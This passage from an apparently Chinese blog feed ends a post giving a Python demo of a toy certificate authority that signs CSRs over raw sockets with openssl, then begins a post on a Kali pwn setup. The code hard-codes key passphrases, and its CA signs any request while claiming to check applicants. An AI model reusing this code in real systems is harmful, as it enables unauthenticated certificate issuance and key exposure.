class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br>CA_host = <span class="hljs-string">&quot;x.x.x.x&quot;</span><br>CA_port = <span class="hljs-number">54321</span><br>CA_download_port = <span class="hljs-number">12345</span><br>cert_num = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># 根证书生成</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Gen_rootCA</span>():<br>    <span class="hljs-comment"># 生成私钥</span><br>    subprocess.run([<span class="hljs-string">&#x27;openssl&#x27;</span>, <span class="hljs-string">&#x27;genrsa&#x27;</span>, <span class="hljs-string">&#x27;-des3&#x27;</span>, <span class="hljs-string">&#x27;-passout&#x27;</span>, <span class="hljs-string">&#x27;pass:3xsh0re&#x27;</span>, <span class="hljs-string">&#x27;-out&#x27;</span>, <span class="hljs-string">&#x27;rootCA.key&#x27;</span>, <span class="hljs-string">&#x27;2048&#x27;</span>])<br>    <span class="hljs-comment"># 指定证书主题字段信息</span><br>    subject_info = <span class="hljs-string">&quot;/C=CN/ST=Beijing/L=Haidian/O=USTB/OU=USTB_CA/CN=USTB.CA&quot;</span><br>    <span class="hljs-comment"># 生成自签名证书</span><br>    subprocess.run(<br>        [<span class="hljs-string">&#x27;openssl&#x27;</span>, <span class="hljs-string">&#x27;req&#x27;</span>, <span class="hljs-string">&#x27;-new&#x27;</span>, <span class="hljs-string">&#x27;-x509&#x27;</span>, <span class="hljs-string">&#x27;-passin&#x27;</span>, <span class="hljs-string">&#x27;pass:3xsh0re&#x27;</span>, <span class="hljs-string">&#x27;-key&#x27;</span>, <span class="hljs-string">&#x27;rootCA.key&#x27;</span>, <span class="hljs-string">&#x27;-days&#x27;</span>, <span class="hljs-string">&#x27;365&#x27;</span>, <span class="hljs-string">&#x27;-out&#x27;</span>,<br>         <span class="hljs-string">&#x27;rootCA.crt&#x27;</span>, <span class="hljs-string">&#x27;-subj&#x27;</span>, subject_info], capture_output=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[+]\033[0m自签名证书生成完成&quot;</span>)<br><br><br><span class="hljs-comment"># 为申请者生成证书</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Sign_Cert</span>():<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> CA_socket:<br>        CA_socket.bind((<span class="hljs-string">&quot;0.0.0.0&quot;</span>, CA_port))<br>        CA_socket.listen(<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0m等待客户端连接...&#x27;</span>)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            conn, addr = CA_socket.accept()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\033[32m[+]\033[0m自<span class="hljs-subst">&#123;addr[<span class="hljs-number">0</span>]&#125;</span>的申请者已连接&#x27;</span>)<br><br>            <span class="hljs-comment"># 生成证书号</span><br>            <span class="hljs-keyword">global</span> cert_num<br>            sig = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;addr[<span class="hljs-number">0</span>].replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)&#125;</span>_<span class="hljs-subst">&#123;addr[<span class="hljs-number">1</span>]&#125;</span>_<span class="hljs-subst">&#123;cert_num&#125;</span>&#x27;</span><br>            cert_num += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">with</span> conn:<br>                conn.settimeout(<span class="hljs-number">2</span>)<br>                csr_data = <span class="hljs-string">b&#x27;&#x27;</span><br>                <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                    <span class="hljs-keyword">try</span>:<br>                        data = conn.recv(<span class="hljs-number">1024</span>)<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                            <span class="hljs-keyword">break</span><br>                        csr_data += data<br>                        <span class="hljs-keyword">pass</span><br>                    <span class="hljs-keyword">except</span> socket.timeout:<br>                        <span class="hljs-keyword">break</span><br>                <span class="hljs-comment"># 生成 req.csr 文件</span><br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;req_<span class="hljs-subst">&#123;sig&#125;</span>.csr&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> csr_file:<br>                    csr_file.write(csr_data)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0m申请文件CSR接收成功&#x27;</span>)<br>                <span class="hljs-comment"># 在这里处理证书请求文件的数据</span><br>                command = [<br>                    <span class="hljs-string">&#x27;openssl&#x27;</span>, <span class="hljs-string">&#x27;x509&#x27;</span>,<br>                    <span class="hljs-string">&#x27;-req&#x27;</span>, <span class="hljs-string">&#x27;-CA&#x27;</span>, <span class="hljs-string">&#x27;./rootCA.crt&#x27;</span>,<br>                    <span class="hljs-string">&#x27;-CAkey&#x27;</span>, <span class="hljs-string">&#x27;rootCA.key&#x27;</span>,<br>                    <span class="hljs-string">&#x27;-CAcreateserial&#x27;</span>,<br>                    <span class="hljs-string">&#x27;-in&#x27;</span>, <span class="hljs-string">f&#x27;./req_<span class="hljs-subst">&#123;sig&#125;</span>.csr&#x27;</span>,<br>                    <span class="hljs-string">&#x27;-passin&#x27;</span>, <span class="hljs-string">&#x27;pass:3xsh0re&#x27;</span>,<br>                    <span class="hljs-string">&#x27;-out&#x27;</span>, <span class="hljs-string">f&#x27;./req_<span class="hljs-subst">&#123;sig&#125;</span>.crt&#x27;</span>,<br>                    <span class="hljs-string">&#x27;-days&#x27;</span>, <span class="hljs-string">&#x27;365&#x27;</span><br>                ]<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[+]\033[0m正在查验申请者资质......&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[+]\033[0m打印签发信息:&quot;</span>)<br>                <span class="hljs-keyword">try</span>:<br>                    subprocess.run(command, stdout=subprocess.DEVNULL)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\033[32m[+]\033[0m来自<span class="hljs-subst">&#123;addr[<span class="hljs-number">0</span>]&#125;</span>的申请者的证书签署完成&quot;</span>)<br>                <span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[-]当前系统没有安装OpenSSL库\033[0m&quot;</span>)<br><br>                <span class="hljs-comment"># 传送CRT</span><br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./req_<span class="hljs-subst">&#123;sig&#125;</span>.crt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>                    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                        data = file.read(<span class="hljs-number">1024</span>)<br>                        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                            <span class="hljs-keyword">break</span><br>                        <span class="hljs-keyword">if</span> conn.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR) == <span class="hljs-number">0</span>:<br>                            conn.sendall(data)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0m证书发送完成!&#x27;</span>)<br>                conn.close()<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0m本次签发结束!\n-------------------------------------------------------&#x27;</span>)<br><br><br><span class="hljs-comment"># CA提供根证书下载</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Download_rootCA</span>():<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> CA_Download_socket:<br>        CA_Download_socket.bind((<span class="hljs-string">&quot;0.0.0.0&quot;</span>, CA_download_port))<br>        CA_Download_socket.listen(<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]rootCA下载端口开放中...\033[0m&#x27;</span>)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            conn, addr = CA_Download_socket.accept()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\033[32m[+]\033[0m自<span class="hljs-subst">&#123;addr[<span class="hljs-number">0</span>]&#125;</span>的下载者已连接&#x27;</span>)<br>            <span class="hljs-comment"># 传送rootCA.crt</span><br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./rootCA.crt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>                <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                    conn.settimeout(<span class="hljs-number">2</span>)<br>                    data = file.read(<span class="hljs-number">1024</span>)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                        <span class="hljs-keyword">break</span><br>                    <span class="hljs-keyword">if</span> conn.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR) == <span class="hljs-number">0</span>:<br>                        conn.sendall(data)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0mrootCA.crt发送完成!\n---------------------------------------------------&#x27;</span>)<br>            conn.close()<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-comment"># Client请求签发证书</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Client_Request_Cert</span>(<span class="hljs-params">username, passwd</span>):<br>    <span class="hljs-comment"># 生成私钥</span><br>    command = [<span class="hljs-string">&#x27;openssl&#x27;</span>, <span class="hljs-string">&#x27;genrsa&#x27;</span>, <span class="hljs-string">&#x27;-des3&#x27;</span>, <span class="hljs-string">&#x27;-passout&#x27;</span>, <span class="hljs-string">f&#x27;pass:<span class="hljs-subst">&#123;passwd&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;-out&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;username&#125;</span>_req.key&#x27;</span>, <span class="hljs-string">&#x27;2048&#x27;</span>]<br>    subprocess.run(command)<br>    <span class="hljs-comment"># 生成证书请求文件CSR</span><br>    subject_info = <span class="hljs-string">f&quot;/C=CN/ST=Beijing/L=Haidian/O=USTB_<span class="hljs-subst">&#123;username&#125;</span>/OU=USTBer/CN=Client_<span class="hljs-subst">&#123;username&#125;</span>&quot;</span><br>    command2 = [<span class="hljs-string">&#x27;openssl&#x27;</span>, <span class="hljs-string">&#x27;req&#x27;</span>, <span class="hljs-string">&#x27;-new&#x27;</span>, <span class="hljs-string">&#x27;-key&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;username&#125;</span>_req.key&#x27;</span>, <span class="hljs-string">&#x27;-passin&#x27;</span>, <span class="hljs-string">f&#x27;pass:<span class="hljs-subst">&#123;passwd&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;-out&#x27;</span>,<br>                <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;username&#125;</span>_req.csr&#x27;</span>, <span class="hljs-string">&#x27;-days&#x27;</span>, <span class="hljs-string">&#x27;365&#x27;</span>, <span class="hljs-string">&#x27;-subj&#x27;</span>, subject_info]<br>    subprocess.run(command2, capture_output=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> client_socket:<br>        client_socket.connect((CA_host, CA_port))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0m已连接至CA服务器&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0m正在向CA发送签发请求.....&#x27;</span>)<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./<span class="hljs-subst">&#123;username&#125;</span>_req.csr&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                data = file.read(<span class="hljs-number">1024</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                    <span class="hljs-keyword">break</span><br>                client_socket.sendall(data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0mCSR文件发送完成!\n&#x27;</span><br>              <span class="hljs-string">&#x27;\033[32m[+]\033[0m正在等待CA签发......&#x27;</span>)<br><br>        crt_data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data = client_socket.recv(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>            crt_data += data<br>        <span class="hljs-comment"># 生成 req.crt 文件</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;username&#125;</span>_req.crt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> csr_file:<br>            csr_file.write(crt_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\033[32m[+]\033[0m证书<span class="hljs-subst">&#123;username&#125;</span>_req.crt制作完成,可在当前文件夹下查看&#x27;</span>)<br><br><br><span class="hljs-comment"># Client验证证书,若验证通过则在当前文件夹下生成服务端公钥</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Client_Verify</span>():<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> client_socket:<br>        client_socket.connect((CA_host, CA_download_port))<br>        crt_data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data = client_socket.recv(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>            crt_data += data<br>        <span class="hljs-comment"># 生成 req.crt 文件</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rootCA.crt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> csr_file:<br>            csr_file.write(crt_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\033[32m[+]\033[0mrootCA.crt下载完成,请在当前目录下查看&#x27;</span>)<br>        verify_command = [<span class="hljs-string">&#x27;openssl&#x27;</span>, <span class="hljs-string">&#x27;verify&#x27;</span>, <span class="hljs-string">&#x27;-CAfile&#x27;</span>, <span class="hljs-string">&#x27;./rootCA.crt&#x27;</span>, <span class="hljs-string">f&#x27;Server_req.crt&#x27;</span>]<br>        result = subprocess.run(verify_command, capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;OK&quot;</span> <span class="hljs-keyword">in</span> result.stdout.strip():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[+]服务器证书验证成功!\033[0m&quot;</span>)<br>            gen_server_pk_command = [<span class="hljs-string">&#x27;openssl x509 -in Server_req.crt -pubkey -noout &gt; server_pk.pem&#x27;</span>]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[+]已经在当前文件夹下生成服务端公钥server_pk.pem!\033[0m&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[-]验证失败！！！\033[0m&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><br><span class="hljs-comment"># Server请求签发证书</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Server_Request_Cert</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 生成私钥</span><br>        command = [<span class="hljs-string">&#x27;openssl&#x27;</span>, <span class="hljs-string">&#x27;genrsa&#x27;</span>, <span class="hljs-string">&#x27;-des3&#x27;</span>, <span class="hljs-string">&#x27;-passout&#x27;</span>, <span class="hljs-string">f&#x27;pass:USTBServer&#x27;</span>, <span class="hljs-string">&#x27;-out&#x27;</span>, <span class="hljs-string">f&#x27;Server_req.key&#x27;</span>, <span class="hljs-string">&#x27;2048&#x27;</span>]<br>        subprocess.run(command, capture_output=<span class="hljs-literal">True</span>)<br>        <span class="hljs-comment"># 生成证书请求文件CSR</span><br>        subject_info = <span class="hljs-string">f&quot;/C=CN/ST=Beijing/L=Haidian/O=USTB_Server/OU=Server/CN=USTB_Server&quot;</span><br>        command2 = [<span class="hljs-string">&#x27;openssl&#x27;</span>, <span class="hljs-string">&#x27;req&#x27;</span>, <span class="hljs-string">&#x27;-new&#x27;</span>, <span class="hljs-string">&#x27;-key&#x27;</span>, <span class="hljs-string">f&#x27;Server_req.key&#x27;</span>, <span class="hljs-string">&#x27;-passin&#x27;</span>, <span class="hljs-string">f&#x27;pass:USTBServer&#x27;</span>, <span class="hljs-string">&#x27;-out&#x27;</span>,<br>                    <span class="hljs-string">f&#x27;Server_req.csr&#x27;</span>, <span class="hljs-string">&#x27;-days&#x27;</span>, <span class="hljs-string">&#x27;365&#x27;</span>, <span class="hljs-string">&#x27;-subj&#x27;</span>, subject_info]<br>        subprocess.run(command2, capture_output=<span class="hljs-literal">True</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0mCSR文件生成成功!&#x27;</span>)<br>    <span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[-]私钥生成失败!!!\033[0m&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[-]查看当前系统是否安装OpenSSL库!!!\033[0m&quot;</span>)<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> client_socket:<br>        client_socket.connect((CA_host, CA_port))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0m已连接至CA服务器&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0m正在向CA发送签发请求.....&#x27;</span>)<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./Server_req.csr&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                data = file.read(<span class="hljs-number">1024</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                    <span class="hljs-keyword">break</span><br>                client_socket.sendall(data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0mCSR文件发送完成!\n&#x27;</span><br>              <span class="hljs-string">&#x27;\033[32m[+]\033[0m正在等待CA签发......&#x27;</span>)<br><br>        crt_data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data = client_socket.recv(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>            crt_data += data<br>        <span class="hljs-comment"># 生成 req.crt 文件</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;Server_req.crt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> csr_file:<br>            csr_file.write(crt_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\033[32m[+]\033[0m证书Server_req.crt制作完成,可在当前文件夹下查看&#x27;</span>)<br><br><span class="hljs-comment"># Server 请求验证客户端证书</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Server_Verify</span>(<span class="hljs-params">username</span>):<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> client_socket:<br>        client_socket.connect((CA_host, CA_download_port))<br>        crt_data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data = client_socket.recv(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>            crt_data += data<br>        <span class="hljs-comment"># 生成 req.crt 文件</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rootCA.crt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> csr_file:<br>            csr_file.write(crt_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\033[32m[+]\033[0mrootCA.crt下载完成,请在当前目录下查看&#x27;</span>)<br>        verify_command = [<span class="hljs-string">&#x27;openssl&#x27;</span>, <span class="hljs-string">&#x27;verify&#x27;</span>, <span class="hljs-string">&#x27;-CAfile&#x27;</span>, <span class="hljs-string">&#x27;./rootCA.crt&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;username&#125;</span>_req.crt&#x27;</span>]<br>        result = subprocess.run(verify_command, capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;OK&quot;</span> <span class="hljs-keyword">in</span> result.stdout.strip():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[+]目标客户端证书验证成功!\033[0m&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[-]验证失败！！！\033[0m&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment"># CA端</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CA</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[34m _   _ ____ _____ ____     ____    _    \033[0m\n&#x27;</span><br>          <span class="hljs-string">&#x27;\033[34m| | | / ___|_   _| __ )   / ___|  / \   \033[0m\n&#x27;</span><br>          <span class="hljs-string">&#x27;\033[34m| | | \___ \ | | |  _ \  | |     / _ \  \033[0m\n&#x27;</span><br>          <span class="hljs-string">&#x27;\033[34m| |_| |___) || | | |_) | | |___ / ___ \ \033[0m\n&#x27;</span><br>          <span class="hljs-string">&#x27;\033[34m\___/ |____/ |_| |____/___\____/_/   \_\ \033[0m\n&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\t\t\t\t\033[34m-------created by 3xsh0re\033[0m&quot;</span>)<br>    root_ca_file = Path(<span class="hljs-string">&quot;rootCA.crt&quot;</span>)<br>    <span class="hljs-keyword">if</span> root_ca_file.is_file():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[+]rootCA.crt已经生成\033[0m&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 生成根证书</span><br>        Gen_rootCA()<br>    <span class="hljs-keyword">with</span> concurrent.futures.ThreadPoolExecutor() <span class="hljs-keyword">as</span> executor:<br>        <span class="hljs-comment"># 提交线程1的执行</span><br>        thread1 = executor.submit(Download_rootCA)<br>        <span class="hljs-comment"># 提交线程2的执行</span><br>        thread2 = executor.submit(Sign_Cert)<br>        <span class="hljs-comment"># 等待两个线程执行完成</span><br>        concurrent.futures.wait([thread1, thread2])<br><br><br><span class="hljs-comment"># Client端请求CA颁发证书</span><br>Client_Request_Cert(<span class="hljs-string">&quot;3xsh0re&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>)<br><span class="hljs-comment"># 用户验证Server</span><br><span class="hljs-comment"># Client_Verify()</span><br><br><span class="hljs-comment"># Server端请求CA颁发证书</span><br><span class="hljs-comment"># Server_Request_Cert()</span><br><span class="hljs-comment"># Server验证用户ZZR</span><br>Server_Verify(<span class="hljs-string">&quot;3xsh0re&quot;</span>)<br><br><span class="hljs-comment"># CA端</span><br><span class="hljs-comment"># CA()</span><br></code></pre></td></tr></table></figure><p>下面是笔者和几个小伙伴用数字认证原理改造的一个Python聊天室项目</p><p><a href="https://github.com/REMIXXYH/ChatRoom">基于CA和SSL改造的ChatRoom</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数字认证技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在Kali下快速配置一个pwn环境</title>
    <link href="/2023/12/03/%E5%9C%A8Kali%E4%B8%8B%E5%BF%AB%E9%80%9F%E9%85%8D%E7%BD%AE%E4%B8%80%E4%B8%AApwn%E7%8E%AF%E5%A2%83/"/>
